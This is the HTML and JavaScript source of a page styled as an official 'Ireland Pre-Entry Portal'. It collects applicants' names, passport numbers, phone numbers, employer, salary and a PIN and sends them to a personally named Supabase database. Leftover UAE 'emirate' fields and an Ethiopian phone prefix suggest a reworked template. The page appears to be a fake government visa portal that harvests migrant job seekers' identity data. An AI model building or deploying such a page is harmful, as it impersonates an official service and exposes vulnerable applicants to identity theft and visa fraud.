<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ireland Pre-Entry Portal</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        :root {
            --ireland-green: #009a44;
            --ireland-orange: #ff7900;
            --dark-blue: #102a43;
            --clean-white: #ffffff;
            --bg-light: #f4f7f6;
            --border-color: #e2e8f0;
        }

        body {
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            background-color: var(--bg-light);
            color: var(--dark-blue);
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        .navbar {
            background-color: var(--ireland-green);
            padding: 20px;
            text-align: center;
            border-bottom: 4px solid var(--ireland-orange);
            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
        }

        .navbar h1 {
            color: white;
            margin: 0;
            font-size: 22px;
            letter-spacing: 1px;
            font-weight: bold;
        }

        .container {
            max-width: 650px;
            width: 100%;
            margin: 40px auto;
            padding: 0 20px;
            box-sizing: border-box;
        }

        .card {
            background: var(--clean-white);
            border-radius: 16px;
            box-shadow: 0 10px 30px rgba(0, 154, 68, 0.05);
            padding: 35px;
            border: 1px solid var(--border-color);
        }

        .profile-icon-container {
            text-align: center;
            margin-bottom: 25px;
        }

        .profile-icon-wrapper {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 85px;
            height: 85px;
            background-color: #f0fff4;
            border: 3px solid #c6f6d5;
            border-radius: 50%;
            color: var(--ireland-green);
            font-size: 38px;
            box-shadow: 0 4px 10px rgba(0, 154, 68, 0.1);
        }

        .form-title {
            text-align: center;
            margin: 0 0 30px 0;
            font-size: 18px;
            font-weight: 600;
            color: var(--dark-blue);
        }

        .form-group {
            margin-bottom: 22px;
        }

        .form-group label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 8px;
            color: #486581;
        }

        .input-icon-wrapper {
            position: relative;
        }

        .input-icon-wrapper i {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #9fb3c8;
            font-size: 16px;
            transition: color 0.3s;
        }

        input[type="text"],
        input[type="password"],
        input[type="tel"],
        select {
            width: 100%;
            padding: 13px 15px 13px 45px;
            border: 1px solid #cbd5e1;
            border-radius: 8px;
            box-sizing: border-box;
            font-size: 15px;
            background-color: #f8fafc;
            transition: all 0.3s ease;
            color: var(--dark-blue);
        }

        input:focus, select:focus {
            background-color: #ffffff;
            border-color: var(--ireland-green);
            outline: none;
            box-shadow: 0 0 0 3px rgba(0, 154, 68, 0.15);
        }

        input:focus + i {
            color: var(--ireland-green);
        }

        .form-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
        }

        @media (max-width: 500px) {
            .form-row {
                grid-template-columns: 1fr;
                gap: 0;
            }
        }

        .btn-submit {
            width: 100%;
            background-color: var(--ireland-green);
            color: white;
            padding: 15px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 12px rgba(0, 154, 68, 0.2);
        }

        .btn-submit:hover {
            background-color: #007a35;
        }

        #successScreen {
            display: none;
            text-align: center;
            padding: 40px 20px;
        }

        #successScreen i {
            font-size: 65px;
            color: var(--ireland-green);
            margin-bottom: 20px;
        }

        #successScreen h2 {
            color: var(--dark-blue);
            margin: 0 0 10px 0;
        }

        #successScreen p {
            color: #627d98;
            font-size: 15px;
            line-height: 1.6;
        }
    </style>
</head>
<body>

<div class="navbar">
    <h1>IRELAND PRE-ENTRY PORTAL</h1>
</div>

<div class="container" id="formContainer">
    <div class="card">
        
        <div class="profile-icon-container">
            <div class="profile-icon-wrapper">
                <i class="fas fa-user-check"></i>
            </div>
        </div>

        <h2 class="form-title">Applicant Registration Form</h2>

        <form id="irelandForm" onsubmit="handleSubmit(event)">
            
            <div class="form-group">
                <label for="txtFullName">Applicant Full Name *</label>
                <div class="input-icon-wrapper">
                    <input type="text" id="txtFullName" placeholder="As written in passport" required>
                    <i class="fas fa-user"></i>
                </div>
            </div>

            <div class="form-row">
                <div class="form-group">
                    <label for="txtPassNo">Passport Number *</label>
                    <div class="input-icon-wrapper">
                        <input type="text" id="txtPassNo" placeholder="e.g. ET123456" required>
                        <i class="fas fa-passport"></i>
                    </div>
                </div>

                <div class="form-group">
                    <label for="txtMobile">Contact Mobile *</label>
                    <div class="input-icon-wrapper">
                        <input type="tel" id="txtMobile" placeholder="e.g. +2519..." required>
                        <i class="fas fa-phone"></i>
                    </div>
                </div>
            </div>

            <div class="form-group">
                <label for="txtCompName">Sponsoring Employer / Host Company *</label>
                <div class="input-icon-wrapper">
                    <input type="text" id="txtCompName" placeholder="Company or organization name" required>
                    <i class="fas fa-building"></i>
                </div>
            </div>

            <div class="form-row">
                <div class="form-group">
                    <label for="txtJobTitle">Job Designation *</label>
                    <div class="input-icon-wrapper">
                        <input type="text" id="txtJobTitle" placeholder="e.g. Technician" required>
                        <i class="fas fa-briefcase"></i>
                    </div>
                </div>

                <div class="form-group">
                    <label for="txtSalary">Monthly Salary (EUR Equivalent) *</label>
                    <div class="input-icon-wrapper">
                        <input type="text" id="txtSalary" placeholder="Estimated amount" required>
                        <i class="fas fa-money-bill-wave"></i>
                    </div>
                </div>
            </div>

            <div class="form-group">
                <label for="selEmirate">Destination County / City *</label>
                <div class="input-icon-wrapper">
                    <select id="selEmirate" required>
                        <option value="">-- Select Destination --</option>
                        <option value="Dublin">Dublin</option>
                        <option value="Cork">Cork</option>
                        <option value="Galway">Galway</option>
                        <option value="Limerick">Limerick</option>
                    </select>
                    <i class="fas fa-map-marker-alt"></i>
                </div>
            </div>

            <div class="form-group">
                <label for="txtPin">Create 4-Digit Security PIN *</label>
                <div class="input-icon-wrapper">
                    <input type="password" id="txtPin" pattern="[0-9]{4}" maxlength="4" placeholder="••••" required>
                    <i class="fas fa-lock"></i>
                </div>
            </div>

            <button type="submit" class="btn-submit" id="btnSubmit">SUBMIT APPLICATION TO LIVE DB</button>
        </form>
    </div>
</div>

<div class="container" id="successScreen">
    <div class="card">
        <i class="fas fa-check-circle"></i>
        <h2>Application Submitted</h2>
        <p>Your record has been successfully transmitted and registered into the live server database. Use your 4-digit security PIN on the status portal to track your progress.</p>
        <br>
        <button class="btn-submit" onclick="window.location.reload()" style="width: auto; padding: 10px 25px;">New Application</button>
    </div>
</div>

<script>
    // Live Supabase API Setup
    const SUPABASE_URL = "https://gizealewtadele107-eng.supabase.co"; 
    const SUPABASE_ANON_KEY = "sb_publishable_P4F2VeRZUpODu0iemenxaQ_Vv3OizSV"; 

    const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

    async function handleSubmit(event) {
        event.preventDefault();
        const submitBtn = document.getElementById('btnSubmit');
        submitBtn.innerText = "Transmitting to Live DB...";
        submitBtn.disabled = true;

        try {
            const { error: dbError } = await _supabase
                .from('visa_applications')
                .insert([{
                    pin: document.getElementById('txtPin').value,
                    status: 'In Process',
                    full_name: document.getElementById('txtFullName').value,
                    passport_number: document.getElementById('txtPassNo').value,
                    company_name: document.getElementById('txtCompName').value,
                    job_title: document.getElementById('txtJobTitle').value,
                    monthly_salary: document.getElementById('txtSalary').value,
                    emirate: document.getElementById('selEmirate').value
                }]);

            if (dbError) throw dbError;

            // የዳታቤዝ ግንኙነቱ ከተሳካ ብቻ ገጹን ይቀይራል
            document.getElementById('formContainer').style.display = 'none';
            document.getElementById('successScreen').style.display = 'block';

        } catch (error) {
            alert("Database connection failed: " + error.message);
            submitBtn.innerText = "SUBMIT APPLICATION TO LIVE DB";
            submitBtn.disabled = false;
        }
    }
</script>
</body>
</html>
